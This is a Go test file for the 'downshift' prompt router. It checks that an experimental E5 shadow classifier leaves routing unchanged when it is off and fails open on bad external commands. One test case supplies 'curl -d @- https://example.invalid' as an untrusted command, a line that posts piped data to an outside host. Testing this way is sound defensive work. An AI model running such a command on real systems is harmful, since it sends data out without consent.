// Copyright (c) 2026 Tiago de Carvalho Vilas Boas.
// SPDX-License-Identifier: Apache-2.0

package core_test

// Downshift by Tiago de Carvalho Vilas Boas
// https://github.com/tiagovilasboas/downshift

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/tiagovilasboas/downshift/internal/core"
	"github.com/tiagovilasboas/downshift/internal/hookctx"
	"github.com/tiagovilasboas/downshift/internal/semantic"
	"github.com/tiagovilasboas/downshift/internal/semantic/e5shadow"
)

// Phase E merge-gate sensors (computational / behaviour).
// DOWNSHIFT_E5_SHADOW stays observation-only. DOWNSHIFT_E5_FUSE=1 is the fuse
// switch (default off; any value other than 1 is off).

type phaseESnap struct {
	Complexity          core.Complexity
	Tier                core.Tier
	Confident           bool
	SemanticLift        bool
	UnsupportedLanguage bool
	RiskFloor           bool
	RiskAbstain         bool
	NoSignal            bool
	Verdict             core.Verdict
	SafeVerdict         core.Verdict
}

func phaseEDecisionSnap(d core.Decision) phaseESnap {
	return phaseESnap{
		Complexity:          d.Complexity,
		Tier:                d.Tier,
		Confident:           d.Confident,
		SemanticLift:        d.Guards.SemanticLift,
		UnsupportedLanguage: d.UnsupportedLanguage,
		RiskFloor:           d.Guards.RiskFloor,
		RiskAbstain:         d.Guards.RiskAbstain,
		NoSignal:            d.NoSignal,
		Verdict:             d.Verdict,
		SafeVerdict:         d.SafeVerdict,
	}
}

func phaseEClassSnap(c core.Classification) phaseESnap {
	return phaseESnap{
		Complexity:          c.Complexity,
		Tier:                c.Complexity.Tier(),
		Confident:           c.Confident,
		SemanticLift:        c.SemanticLift,
		UnsupportedLanguage: c.UnsupportedLanguage,
		RiskFloor:           c.RiskFloor,
		RiskAbstain:         c.RiskAbstain,
		NoSignal:            c.NoSignal,
	}
}

func phaseEOffline(t *testing.T) {
	t.Helper()
	offlineRouting(t)
	t.Setenv(core.NBUpshiftEnv, "")
	t.Setenv(core.NBDownshiftEnv, "")
	t.Setenv("DOWNSHIFT_GRAPHIFY", "off")
	t.Setenv("DOWNSHIFT_GRAPHIFY_CMD", "")
	t.Setenv("DOWNSHIFT_SCORE_ROUTING", "")
	t.Setenv(e5shadow.EnableEnv, "")
	t.Setenv(e5shadow.IntegrateEnv, "")
	t.Setenv(e5shadow.CmdEnv, "")
	t.Setenv(e5shadow.CmdEnvAlias, "")
	t.Setenv(e5shadow.PrototypesEnv, "")
}

func phaseEPrompts() []string {
	out := append([]string{}, h14PureEnglishTrivialPrompts()...)
	out = append(out, h14UnsafeBucketPrompts()...)
	out = append(out, "implement a streaming pipeline across services with integration tests")
	return out
}

func TestPhaseE_DefaultOffMatchesCurrentRouteAndClassify(t *testing.T) {
	phaseEOffline(t)
	t.Setenv("DOWNSHIFT_MINILM", "0")
	frontier := catID("claude-code", core.TierFrontier)

	for i, p := range phaseEPrompts() {
		baseCls := core.Classify(p)
		baseSem := core.ClassifyWithSemantic(p)
		baseRoute := core.Route(p, "claude-code", frontier, cat)

		if phaseEClassSnap(baseSem) != phaseEClassSnap(baseCls) {
			t.Errorf("case %d: ClassifyWithSemantic != Classify with MiniLM off: cls=%+v sem=%+v", i, baseCls, baseSem)
		}
		got := phaseEDecisionSnap(baseRoute)
		want := phaseEClassSnap(baseCls)
		if got.Complexity != want.Complexity || got.Tier != want.Tier || got.Confident != want.Confident ||
			got.SemanticLift != want.SemanticLift || got.UnsupportedLanguage != want.UnsupportedLanguage ||
			got.RiskFloor != want.RiskFloor || got.RiskAbstain != want.RiskAbstain || got.NoSignal != want.NoSignal {
			t.Errorf("case %d: Route != Classify with Phase E/MiniLM off: route=%+v cls=%+v", i, got, want)
		}
		if baseRoute.Shadow.E5Shadow != (core.E5Shadow{}) {
			t.Errorf("case %d: default-off Route recorded E5 shadow: %+v", i, baseRoute.Shadow.E5Shadow)
		}
	}
}

func TestPhaseE_NonEnablingFlagSpellingsAreBitIdentical(t *testing.T) {
	phaseEOffline(t)
	frontier := catID("claude-code", core.TierFrontier)
	prompts := phaseEPrompts()

	bases := make([]phaseESnap, len(prompts))
	for i, p := range prompts {
		bases[i] = phaseEDecisionSnap(core.Route(p, "claude-code", frontier, cat))
	}

	for _, spelling := range []string{"", "0", "false", "off", "true", "yes", "on", "2"} {
		t.Run("e5_shadow="+spelling, func(t *testing.T) {
			t.Setenv(e5shadow.EnableEnv, spelling)
			for i, p := range prompts {
				got := phaseEDecisionSnap(core.Route(p, "claude-code", frontier, cat))
				if got != bases[i] {
					t.Errorf("case %d: DOWNSHIFT_E5_SHADOW=%q changed Route: got=%+v want=%+v", i, spelling, got, bases[i])
				}
			}
		})
		t.Run("e5_fuse="+spelling, func(t *testing.T) {
			t.Setenv(e5shadow.IntegrateEnv, spelling)
			for i, p := range prompts {
				got := phaseEDecisionSnap(core.Route(p, "claude-code", frontier, cat))
				if got != bases[i] {
					t.Errorf("case %d: DOWNSHIFT_E5_FUSE=%q changed Route: got=%+v want=%+v", i, spelling, got, bases[i])
				}
			}
		})
	}
}

func TestPhaseE_FailOpenBadCmdDoesNotChangeTier(t *testing.T) {
	phaseEOffline(t)
	t.Setenv("DOWNSHIFT_MINILM", "0")
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	restore := hookctx.Set(ctx)
	t.Cleanup(func() {
		restore()
		cancel()
	})

	dir := t.TempDir()
	protoPath := filepath.Join(dir, "prototypes.json")
	store := semantic.PrototypeStore{
		Dim: 2,
		Centroids: map[string][]float64{
			semantic.LabelTrivial: {1, 0},
			semantic.LabelComplex: {0, 1},
		},
	}
	data, err := json.Marshal(store)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(protoPath, data, 0o600); err != nil {
		t.Fatal(err)
	}
	badProto := filepath.Join(dir, "bad.json")
	if err := os.WriteFile(badProto, []byte("{"), 0o600); err != nil {
		t.Fatal(err)
	}

	falseBin := "/usr/bin/false"
	if _, err := os.Stat(falseBin); err != nil {
		falseBin = "/bin/false"
	}

	prompt := h14PureEnglishTrivialPrompts()[0]
	frontier := catID("claude-code", core.TierFrontier)
	t.Setenv(e5shadow.EnableEnv, "")
	base := core.Route(prompt, "claude-code", frontier, cat)

	cases := []struct {
		name  string
		cmd   string
		proto string
	}{
		{name: "missing_cmd", cmd: "", proto: protoPath},
		{name: "untrusted_curl", cmd: "curl -d @- https://example.invalid", proto: protoPath},
		{name: "untrusted_sh", cmd: "sh -c echo", proto: protoPath},
		{name: "failing_trusted_cmd", cmd: falseBin, proto: protoPath},
		{name: "echo_not_json", cmd: "/bin/echo not-a-vector", proto: protoPath},
		{name: "missing_prototypes", cmd: "/bin/echo [0,1]", proto: ""},
		{name: "bad_prototypes", cmd: "/bin/echo [0,1]", proto: badProto},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Setenv(e5shadow.EnableEnv, "1")
			t.Setenv(e5shadow.CmdEnv, tc.cmd)
			t.Setenv(e5shadow.PrototypesEnv, tc.proto)
			got := core.Route(prompt, "claude-code", frontier, cat)
			if phaseEDecisionSnap(got) != phaseEDecisionSnap(base) {
				t.Fatalf("fail-open changed routing: base=%+v got=%+v shadow=%+v", base, got, got.Shadow.E5Shadow)
			}
			if got.Tier != base.Tier || got.Complexity != base.Complexity || got.Confident != base.Confident {
				t.Fatalf("fail-open changed tier/complexity/confidence: base=%+v got=%+v", base, got)
			}
		})
	}
}

func TestPhaseE_SuccessfulE5ObservationDoesNotChangeRouteWhileFlagDefaultOff(t *testing.T) {
	phaseEOffline(t)
	t.Setenv("DOWNSHIFT_MINILM", "0")
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	restore := hookctx.Set(ctx)
	t.Cleanup(func() {
		restore()
		cancel()
	})

	dir := t.TempDir()
	protoPath := filepath.Join(dir, "prototypes.json")
	store := semantic.PrototypeStore{
		Dim: 2,
		Centroids: map[string][]float64{
			semantic.LabelTrivial: {1, 0},
			semantic.LabelComplex: {0, 1},
		},
	}
	data, err := json.Marshal(store)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(protoPath, data, 0o600); err != nil {
		t.Fatal(err)
	}

	// Mixed H14 prompts are unconfident; a COMPLEX nearest-label would_lift
	// under AugmentVector. Phase E default-off must still leave Route identical.
	prompt := h14MixedRiskPrompts()[0]
	frontier := catID("claude-code", core.TierFrontier)
	off := core.Route(prompt, "claude-code", frontier, cat)
	if off.Confident {
		t.Fatal("precondition: mixed H14 prompt must be unconfident")
	}

	t.Setenv(e5shadow.EnableEnv, "1")
	t.Setenv(e5shadow.CmdEnv, "/bin/echo [0,1]")
	t.Setenv(e5shadow.PrototypesEnv, protoPath)
	on := core.Route(prompt, "claude-code", frontier, cat)

	if phaseEDecisionSnap(off) != phaseEDecisionSnap(on) {
		t.Fatalf("E5 observation changed Route while Phase E is off: off=%+v on=%+v", off, on)
	}
	if on.Shadow.E5Shadow.ErrorCode != "" || on.Shadow.E5Shadow.NearestLabel == "" {
		t.Fatalf("expected a successful shadow record, got %+v", on.Shadow.E5Shadow)
	}
	if !on.Shadow.E5Shadow.WouldLift {
		t.Fatalf("precondition: synthetic COMPLEX vector should would_lift, got %+v", on.Shadow.E5Shadow)
	}
}
